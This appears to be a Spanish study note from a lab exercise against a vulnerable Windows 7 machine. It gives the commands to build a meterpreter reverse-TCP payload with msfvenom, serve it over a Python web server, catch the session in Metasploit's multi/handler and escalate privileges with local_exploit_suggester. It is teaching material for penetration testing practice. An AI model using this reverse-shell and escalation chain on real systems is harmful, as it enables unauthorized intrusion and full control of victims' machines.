Vamos a practicar en una maquina Windows 7 vulnerable.

- Vamos a adquirir una sesión de meterpreter en Windows.
	- meterpreter: Payload potente. Se utiliza para realizar tareas de post-explotación en una máquina comprometida.
- Vamos a generar un payloads con la herramienta ==msfvenom==.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP_ATACANTE) LPORT=4444 -f exr -o (NOMBRE_ARCHIVO_CREADO)
```

![](../Imagenes/Pasted%20image%2020250112145720.png)
- Esta la posibilidad que nos tire un error con relación a los bits, para solucionarlo tenemos que modificar el comando.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(IP_ATACANTE) LPORT=4444 -f exr -o (NOMBRE_ARCHIVO_CREADO)
```
- Agregamos /x64/.
- Ya que lo tenemos, lo vamos a compartir por un servidor creado en Paython.
```
python3 -m http.server 80
```
![[Pasted image 20250112150214.png]]
- Ahora, en la maquina windows ponemos la IP de la maquina atacante en la URL.

![](../Imagenes/Pasted%20image%2020250112150311.png)
- Descargamos el archivo virus.
- Ahora, abrimos ==metasploit== para ponernos en escucha.
- Para abrir el ==metasploit== en la consola usamos el comando `msfconsole`.
- Ya dentro vamos a usar el siguiente comando:
```
use /multi/handler
```
- Que cumple la función de ==nc==.

![](../Imagenes/Pasted%20image%2020250112150659.png)
- Ya con este payloads vamos a configurarlo con el comando `show options` y vamos a rellenar con la información faltante.

![](../Imagenes/Pasted%20image%2020250112150841.png)
- Ahora nos falta modificar el payload como tal, usamos el comando `set PAYLOAD` y ponemos el payload que creamos en msfvenom.
![](../Imagenes/Pasted%20image%2020250112151054.png)
- Ahora hacemos ==run== en el payload y en windows ejecutamos el programa virus.

![](../Imagenes/Pasted%20image%2020250112151222.png)
- Estamos dentro.
- Estando dentro vamos a usar el comando `background`.

![](../Imagenes/Pasted%20image%2020250112151407.png)
- Este comando permite una sesión activa de meterpreter a fondo, permite que el operador regrese al prompt principal de metasploit (msf) para ejecutar otros comandos o iniciar nuevas sesiones.
- ==Metasploit== tiene un payload que automatiza la búsqueda de sploit que nos permite escalar privilegios.
```
search local_exploit_suggester
```

![](../Imagenes/Pasted%20image%2020250112151806.png)
- Lo vamos a seleccionar.
- Lo vamos a configurar.

![](../Imagenes/Pasted%20image%2020250112151850.png)
- Solo nos va a pedir la session activa de windows.
```
sessions -l
```

![](../Imagenes/Pasted%20image%2020250112152004.png)
- Y la seleccionamos.
```
set SESSION (NUMERO_SESSION)
```

![](../Imagenes/Pasted%20image%2020250112152050.png)
- Verificamos.

![](../Imagenes/Pasted%20image%2020250112152118.png)
- Ya esta seleccionado.
- Ejecutamos el comando run.

![](../Imagenes/Pasted%20image%2020250112152149.png)

![](../Imagenes/Pasted%20image%2020250112152247.png)
- Los exploit verdes son los que nos interesan.
- Vamos a explotar el que esta marcado.
- Copiamos el exploit y usamos el comando `use` + el nombre del exploit.
![](../Imagenes/Pasted%20image%2020250112152401.png)
- Lo configuramos.
![](../Imagenes/Pasted%20image%2020250112152437.png)
- Como podemos ver, nos piden 2 cosas:
	- 1.- La session (que ya sabemos que hay 1 en este windows)
	- 2.- LHOST que es la IP atacante.

![](../Imagenes/Pasted%20image%2020250112152623.png)
- Ya configurado, ejecutamos comando ==run==.
- ==SI YA ESTAMOS OCUPANDO EL PUERTO 4444 ANTERIORMENTE ES RECOMENDABLE CAMBIARLO POR CUALQUIER OTRO==.
![](../Imagenes/Pasted%20image%2020250112152831.png)
- Nuevamente tenemos una sesión meterpreter, ahora vamos a ejecutar el comando `shell` para posterior ejecutar el comando `whoami` y ver si somos usuarios principal.
![](../Imagenes/Pasted%20image%2020250112152944.png)
- Lo somos.